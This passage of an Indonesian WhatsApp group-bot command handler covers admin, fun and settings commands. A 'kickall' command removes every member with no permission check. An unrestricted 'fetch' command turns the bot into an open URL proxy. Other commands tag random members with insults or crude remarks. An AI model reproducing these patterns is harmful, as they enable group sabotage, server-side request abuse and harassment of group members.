 reply(`Kirim perintah ${prefix}promote @tag atau nomor atau reply pesan orang yang ingin di promote`)



  }



  break



  case 'demote': case 'odemote':



  fakegroup('sukses demote admin')



  if (!isGroup) return reply('GROUP ONLY')



 if (command.split(prefix)[1] === 'odemote' && !isPremium) return reply('ONLY PREMIUM')



if (!isGroupAdmins && !isPremium)return reply('ONLY ADMIN')



  mentioned = wan.message.extendedTextMessage.contextInfo.participant







if (mentioned.length !== 0){



  wann.groupDemoteAdmin(from, mentioned)



  .then((res) => reply(jsonformat(res)))



  .catch((err) => reply(jsonformat(err)))



} else if (isQuotedMsg) {



  if (quotedMsg.sender === ownerNumber) return reply(`Tidak bisa kick Owner`)



 wann.groupDemoteAdmin(from, [quotedMsg.sender])



  .then((res) => reply(jsonformat(res)))



  .catch((err) => reply(jsonformat(err)))



} else if (!isNaN(args[1])) {



  wann.groupDemoteAdmin(from, [args[1] + '@s.whatsapp.net'])



  .then((res) => reply(jsonformat(res)))



  .catch((err) => reply(jsonformat(err)))



} else {







  reply(`Kirim perintah ${prefix}demote @tag atau nomor atau reply pesan orang yang ingin di demote`)



}



break



case 'linkgc': case 'linkgrup': case 'linkgroup':



if (!isGroup) return reply('ONLY GRUP')



  if (!isBotGroupAdmins) return reply('ONLY OWNER')



 wann.groupInviteCode(from)



  .then((res) => fakegroup('https://chat.whatsapp.com/' + res))



  break



  case 'setgrupname':



  if (!isGroup) return reply(mess.only.group)



 if (!isBotGroupAdmins) return 



if (args.length == 0) return reply(`Penggunaan ${prefix}setgrupname name`)



  wann.groupUpdateSubject(from, q)



.then((res) => reply(jsonformat(res)))



.catch((err) => reply(jsonformat(err)))



break



case 'setdesc':



if (!isGroup) return reply(mess.only.group)



  if (!isBotGroupAdmins) return reply(mess.only.Badmin)



 if (args.length == 0)  return reply(`Penggunaan ${prefix}setdesc desc`)



wann.groupUpdateDescription(from, q)



 .then((res) => reply(jsonformat(res)))



 .catch((err) => reply(jsonformat(err)))



 break



 case "prefix":



 if (!args.length) return reply(`Opsi prefix\n\n- noprefix\n- multi\n\n- oneprefix\n\nExample : ${prefix}prefix noprefix`)



if (args[0] === "multi") {



  multipref = true;



  noprefix = false;



  oneprefix = false;



  reply("berhasil mengubah ke multi prefix")



} else if (args[0] === "noprefix") {



  multipref = false;



  noprefix = true;



  oneprefix = false;



  reply("berhasil mengubah ke no prefix")



} else if (q === "oneprefix") {



  multipref = false;



  noprefix = false;



  oneprefix = true;



  reply(`One prefix untuk saat ini adalah ( ${prefix} ) untuk mengganti prefix ketik ${prefix}setprefix`)



} else {



  reply("pilih multi, noprefix, atau one prefix")



}







break



case "setprefix":



if (!q) return reply("Prefix nya mau apa?")



  multipref = false;



noprefix = false;



oneprefix = true;



preff = q



break



case 'setppgrup':



if (!isGroup) return reply(mess.only.group)



  if (!isBotGroupAdmins) return reply(mess.only.Badmin)



 if (isQuotedImage) {



let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : wan



let media = await wann.downloadMediaMessage(encmedia)



wann.updateProfilePicture(from, media)



.then((res) => reply(jsonformat(res)))



.catch((err) => reply(jsonformat(err)))



 } else {



reply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)



 }



 break



 case 'me':



 case 'profile':







 wann.updatePresence(from, Presence.composing)



 try {



profil = await wann.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)



 } catch {



profil = errorImg



 }



 thu = await wann.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)



 me = wann.user



 uptime = process.uptime()



 profile = `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Premium*: ${isPremium ? 'Ya' : 'No'}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\nYour progress:\n➸ *Level*: ${Levelnye}\n➸ *XP*: ${Xpluu} / ${requiredXplu}`



 buff = await getBuffer(profil)



 wann.sendMessage(from, buff, image, {quoted: freply, caption: profile})



 break



 case 'afk': 



 if (!isGroup) return reply(mess.only.group)



if (isAfkOn) return reply('Woe Kalo Mau Afk Jangan Nimbrung di sini')



  const reason = q ? q : 'Nothing.'



afk.addAfkUser(sender, time, reason, _afk)



const aluty = `Fitur AFK berhasil *diaktifkan!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`



reply(aluty)



break



case 'infogrup':



case 'infogrouup':



case 'grupinfo':



case 'groupinfo':



if (!isGroup) return reply(mess.only.group)



  try {



 var pic = await wann.getProfilePicture(from)



  } catch {



 var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'



  }



  let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n${groupMetadata.desc}`



  wann.sendMessage(from, await getBuffer(pic), image, {quoted: freply, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})



  break



  case 'tagall':



  if (!isGroup) return reply(mess.only.group)

 if (!isGroupAdmins) return reply(mess.only.admin)

 let arr = [];



  let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`



  for (let i of groupMembers){



 txti += `=> @${i.jid.split("@")[0]}\n`



 arr.push(i.jid)



  }



  mentions(txti, arr, true)



  break



 case 'kickall': // Anti Banned



 for (let i of groupMembers) {



  await kickMember(from, [i.jid])



}



break



case 'leave':



if (!isOwner) return 



  if (!isGroup) return reply(mess.only.group)



 setTimeout( () => {



wann.groupLeave(from) 



 }, 2000)



  setTimeout( () => {



 reply('Byee...')



  }, 0)



  break



  case 'online':



  case 'listonline':



  case 'here':



  if (!isGroup) return reply(`Only group`)



try {



  let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from



  let online = [...Object.keys(wann.chats.get(ido).presences), wann.user.jid]



  wann.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: freply, contextInfo: { mentionedJid: online }})



} catch (e) {



  reply(`${e}`)



}



break



case 'hidetag':

              if (!isGroup) return reply(mess.only.group)


               if (!isGroupAdmins) return reply(mess.only.admin)
try {



  quotedText = wan.message.extendedTextMessage.contextInfo.quotedMessage.conversation



  hideTag(from, `${quotedText}`)



} catch {



  hideTag(from, `${q}`)



}



break



case 'sider':



if(!isGroup) return reply(mess.only.group)



  try {



 infom = await wann.messageInfo(from, wan.message.extendedTextMessage.contextInfo.stanzaId)



 tagg = []



 teks = `*• Dibaca oleh:*\n\n`



 for(let i of infom.reads){



teks += '@' + i.jid.split('@')[0] + '\n'



teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'



tagg.push(i.jid)



 }



 teks += `*• Tersampaikan pada:*\n\n`



 for(let i of infom.deliveries){



teks += '@' + i.jid.split('@')[0] + '\n'



teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'



tagg.push(i.jid)



 }



 mentions(teks, tagg, true)



  } catch (e) {



 console.log(color(e))



 reply('Reply chat bot!')



  }



  break



//------------------< Fun >-------------------



case 'wangy':



if (!q) return



  qq = q.toUpperCase()



awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`



reply(awikwok)



break



case 'mining':



var mining = randomNomor(1000)



atm.addKoinUser(sender, mining, _uang)



await reply(`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`)



break



case 'waktu':



reply(`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`)



break



case 'cekmati':



if (!q) return reply(mess.wrongFormat)



  predea = await axios.get(`https://api.agify.io/?name=${q}`)



reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)



break



case 'togel':



reply(mess.wait)



try {



  dataplai = await axios.get(`https://api.vhtewan.com/togel&apikey=${setting.vhtearkey}`)



  dataplay = dataplai.data.result



  let tomgel = `*Huzzzzz*\n`



  for (let i = 0; i < dataplay.hasil.length; i++) {



 tomgel += `\n═════════════════\n\n*Negara* : ${dataplay.hasil[i].Negara}\n*Result* : ${dataplay.hasil[i].Senin}\n*Result* : ${dataplay.hasil[i].Selasa}\n*Result* : ${dataplay.hasil[i].Rabu}\n*Result* : ${dataplay.hasil[i].Kamis}\n*Result* : ${dataplay.hasil[i].Jumat}\n*Result* : ${dataplay.hasil[i].Sabtu}\n*Result* : ${dataplay.hasil[i].Minggu}\n`



  }



  sendText(from, tomgel)



} catch (err) {



  console.log(err)



}



break



case 'toxic':



Toxic().then(toxic => {



  reply (toxic)



})



break



case 'citacita':



const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']



const cita3 = cita[Math.floor(Math.random() * cita.length)]



cita2 = await getBuffer(cita3)



wann.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: freply})



break



case 'apakah':



apakah = body.slice(1)



const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']



const kah = apa[Math.floor(Math.random() * apa.length)]



wann.sendMessage(from, '*Pertanyaan :* '+apakah+'\n*Jawaban :* '+ kah, text, { quoted: freply })



break



case 'rate':



case 'nilai':



rate = body.slice(1)



const ra =['0','4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']



const te = ra[Math.floor(Math.random() * ra.length)]



wann.sendMessage(from, '*Pertanyaan :* '+rate+'\n*Jawaban :* '+ te+'%', text, { quoted: freply })



break



case 'bay':



reply('Sayonara buat yang pergi😔\n Semoga amal ibadahnya di terima :)')



break



case 'selamatdatang':



reply('welcome kak jangan lupa patuhi peraturan  grup ya kaka \n Semoga betah👏')



break



case 'gantengcek':



case 'cekganteng':



ganteng = body.slice(1)



const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']



const teng = gan[Math.floor(Math.random() * gan.length)]



wann.sendMessage(from, '*Pertanyaan :* '+ganteng+'\n*Jawaban :* '+ teng+'%', text, { quoted: freply })



break



case 'cantikcek':



case 'cekcantik':



cantik = body.slice(1)



const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']



const tik = can[Math.floor(Math.random() * can.length)]



wann.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: freply })



break



case 'cekwatak':



var namao = pushname



var prfx = await wann.getProfilePicture(sender)



const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']



const wtk = watak[Math.floor(Math.random() * (watak.length))]



const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']



const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]



const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']



const sft = sifat[Math.floor(Math.random() * (sifat.length))]



const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colkyy','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']



const hby = hobby[Math.floor(Math.random() * (hobby.length))]



const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']



const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]



const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']



const typo = tipe[Math.floor(Math.random() * (tipe.length))]



await reply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)



break



case 'hobby':



hobby = body.slice(1)



const by = hobby[Math.floor(Math.random() * hobby.length)]



wann.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: freply })



break



case 'bisakah':



bisakah = body.slice(1)



const bisa =['Bisa','Tidak Bisa','Coba Ulangi','MANA GW TAU']



const keh = bisa[Math.floor(Math.random() * bisa.length)]



wann.sendMessage(from, '*Pertanyaan :* '+bisakah+'\n*Jawaban :* '+ keh, text, { quoted: freply })



break



case 'kapankah':



kapankah = body.slice(1)



const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']



const koh = kapan[Math.floor(Math.random() * kapan.length)]



wann.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: freply })



break



case 'truth':



const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']



const ttrth = trut[Math.floor(Math.random() * trut.length)]



truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)



wann.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: freply })



break



case 'dare':



const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "??💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']



const der = dare[Math.floor(Math.random() * dare.length)]



buff = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)



buttons = [{buttonId: noprefix ? command : "!"+command, buttonText:{displayText: `➡️Next`},type:1}]



imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage



buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,



contentText:'*Dare*\n\n'+ der,buttons,headerType:4}



prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



wann.relayWAMessage(prep)



break		



case 'jadian':



jds = []



jdii = groupMembers



koss = groupMembers



akuu = jdii[Math.floor(Math.random() * jdii.length)]



diaa = koss[Math.floor(Math.random() * koss.length)]



teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `



jds.push(akuu.jid)



jds.push(diaa.jid)



mentions(teks, jds, true)



break



case 'cantik':



membr = []



const mes = groupMembers



const msk = groupMembers



const siaps = mes[Math.floor(Math.random() * mes.length)]



const sips = pushname[Math.floor(Math.random() * msk.length)]



teks = `*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`



membr.push(siaps.jid)



mentions(teks, membr, true)



break



case 'ganteng':



membr = []



const nus = groupMembers



const msl = groupMembers



const siapss = nus[Math.floor(Math.random() * nus.length)]



const sipss = pushname[Math.floor(Math.random() * msl.length)]



teks = `*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`



membr.push(siapss.jid)



mentions(teks, membr, true)



break



case 'babi':



membr = []



const meg = groupMembers



const mge = groupMembers



const ba = meg[Math.floor(Math.random() * meg.length)]



const bi = pushname[Math.floor(Math.random() * mge.length)]



teks = `*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`



membr.push(ba.jid)



mentions(teks, membr, true)



break



case 'beban':



membr = []



const nge = groupMembers



const tod = groupMembers



const beb = nge[Math.floor(Math.random() * nge.length)]



const an = pushname[Math.floor(Math.random() * tod.length)]



teks = `*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`



membr.push(beb.jid)



mentions(teks, membr, true)



break



//------------------< Lainnya >-------------------



case 'getpp':



if (wan.message.extendedTextMessage === null || wan.message.extendedTextMessage === undefined) {



 linkpp = await wann.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"



 buffer = await getBuffer(linkpp)



 wann.sendMessage(from, buffer, image, {caption: "Nih", quoted: freply })



} else if (wan.message.extendedTextMessage.contextInfo.mentionedJid === null || wan.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {



 mberr = wan.message.extendedTextMessage.contextInfo.participant



 linkpp = await wann.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"



 buffer = await getBuffer(linkpp)



 wann.sendMessage(from, buffer, image, { quoted: freply, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})



} else if (wan.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {



 mberr = wan.message.extendedTextMessage.contextInfo.mentionedJid[0]



 linkpp = await wann.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"



 buffer = await getBuffer(linkpp)



 wann.sendMessage(from, buffer, image, { quoted: freply, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})



}



break



case 'd':



case 'del':



  case 'delete': // MR.CYSER



  try {



if (wan.message.extendedTextMessage === undefined || wan.message.extendedTextMessage === null) return reply('Reply chat bot')



  wann.deleteMessage(from, {id: wan.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true})



 } catch (e){



reply('Reply chat bot')



 }



 break



 case 'tes':



   txtt =`Hai Kak ${pushname} *BOT Sudah Online😁* \n ${runtime(process.uptime())}⏰`







 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: 'BACK TO MENU'},type:1},{buttonId:noprefix ? "owner" : "!"+"owner", buttonText:{displayText:'👤OWNER BOT'},type:1},{buttonId: noprefix ? "infoig" : "!"+"infoig",buttonText:{displayText: 'INFO OWNER'},type:1}]



 buttonsMessage = {



contentText: `${txtt}`,



footerText: 'Im Wann Botz Sudah On ',



buttons: buttons,



headerType: 1



 }



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{})



 wann.relayWAMessage(prep)



 break



  case 'info':  // Jangan Di Ubah Plise



  urlinfo = 'https://telegra.ph/file/5a8d6bf0339cc120bfb6c.jpg'



  thankslort = `┌──「 *INFORMATION* 」



  │



  ├ *BOT TYPE* : NodeJS



  ├ *NAME*  : wann



  ├ *VERSION* : 1.0



  ├ *GITHUB* : WannRiz
  │
  ├─「 *𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊* 」
  │
  ├ ALLAH SWT
  ├ Iky Ads
  ├ Zeeone OFC
  ├ Nurutomo
  ├ Arifin Razzaq Official
  ├ LolHuman
  ├ Kwn² Yg Bantu Gw
  ├ And all creator bot
  │
  └──「 *${botName}* 」`



  wann.sendMessage(from, await getBuffer(urlinfo), image, {quoted: freply, caption: thankslort })



  break



  case 'media':



  if (!q) return reply('Urlnya?')



 reply(mess.wait)



  sendMediaURL(from, `${args[0]}`, "").catch(() => reply('Error'))



  break



  case 'get':



case 'fetch': //ambil dari nuru



if (!/^https?:\/\//.test(q)) return reply('Awali *URL* dengan http:// atau https://')



 res = await fetch(q)



  if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {



 delete res



 throw `Content-Length: ${res.headers.get('content-length')}`



  }



  if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, q)



 txtx = await res.buffer()



  try {



 txtx = util.format(JSON.parse(txtx+''))



  } catch (e) {



 txtx = txtx + ''



  } finally {



 reply(txtx.slice(0, 65536) + '')



  }



  break



  case 'searchmsg': 



case 'caripesan':  //by ANU TEAM



if (args.length < 1) return reply(`Pesan Yang Mau Dicari Apaan?\nContoh : ${prefix + command} halo|10`)



 teks = arg



if (teks.includes("|")) { 



 try {



var ve = teks.split("|")[0]



var za = teks.split("|")[1]



sampai = `${za}`



if (isNaN(sampai)) return reply('Harus berupa Angka!')



  batas = parseInt(sampai) + 1



if (batas > 30) return reply('Maks 30!')



  reply(mess.wait)



cok = await wann.searchMessages(`${ve}`, from, batas,1) 



if (cok.messages.length < 2) return reply('Tidak Ditemukan Pesan') 



  if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)



 for (i=1;i < cok.messages.length;i++) {



if (cok.messages[i].message) {



  wann.sendMessage(from, `Ditemukan!`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 



}



 }



  } catch (e) {



 return reply(String(e))



  }



} else {



  reply(`Format salah tod, ini contoh format yang benar : ${prefix + command} halo|10`)



}



break



case 'lolkey':



case 'cekapikey':



if (args.length < 1) return reply(`Ketik ${prefix}lolkey [Apikeynya]`) 



 anu = await fetchJson(`http://Api.lolhuman.xyz/api/checkapikey?apikey=${q}`)



  teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = http://Api.lolhuman.xyz`



  wann.sendMessage(from, teks, text, {quoted: freply})



  break



  case 'bugreport':



  if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 



 teks = args.join(' ')



  reply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')



  wann.sendMessage('6285215319934@s.whatsapp.net',`*Bug Report:* ${teks}`, text)



  break



  case 'readall':



  totalchat.map( async ({ jid }) => {



 await wann.chatRead(jid)



  })



  reply(`\`\`\`Berhasil membaca ${unread.length} Chat !\`\`\``)



  console.log(totalchat.length)



  break	







//------------------< Enable/Disable >-------------------



case 'leveling':







if (!isGroup) return reply(mess.only.group)







  if (ar[0] === 'enable') {







 if (isLevelingOn) return reply('Fitur leveling telah diaktifkan sebelumnya.')







_leveling.push(from)







 fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))







 reply('Fitur leveling berhasil diaktifkan.')







  } else if (ar[0] === 'disable') {







 var anup = _leveling.indexOf(from)







 _leveling.splice(anup, 1)







 fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))







 reply('Fitur leveling berhasil dimatikan.')







  } else {







 reply('Pilih enable atau disable!')







  }







  break



  case 'antilink':







              if (!isGroup) return reply(mess.only.group)







               if (!isGroupAdmins) return reply(mess.only.admin)







              if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)







              if (!q) return reply(`Pilih enable atau disable`)







              if (args[0].toLowerCase() === 'enable'){







              if (isAntiLink) return reply(`Udah aktif`)







              antilink.push(from)







              fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))







              reply('*「 ANTILINK DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!')







              } else if (args[0].toLowerCase() === 'disable'){







              let anu = antilink.indexOf(from)







              antilink.splice(anu, 1)







              fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))







              reply('*「 ANTILINK DI NONAKTIFKAN 」*')







              } else {







              txtt =`Hai Kak ${pushname}\n ANTILINKNYA KAK?`















 buttons = [{buttonId: noprefix ? "antilink enable" : "!"+"antilink enable",buttonText:{displayText: '👽ANTILINK ON'},type:1},{buttonId:noprefix ? "antilink disable" : "!"+"antilink disable", buttonText:{displayText:'??ANTILINK OFF'},type:1}]







 buttonsMessage = {







contentText: `${txtt}`,







footerText: 'Antilink Nya kak',







buttons: buttons,







headerType: 1







 }







 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{})







 wann.relayWAMessage(prep)







}







              break







  case 'welcome':







  if (!isGroup) return reply(mess.only.group)







    if (!isBotGroupAdmins) return reply(mess.only.Badmin)







if (args.length < 1) return reply('!welcome enable/disable')







  if ((args[0]) === 'enable') {







 if (isWelkom) return reply('Udah aktif')







welkom.push(from)







 fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))







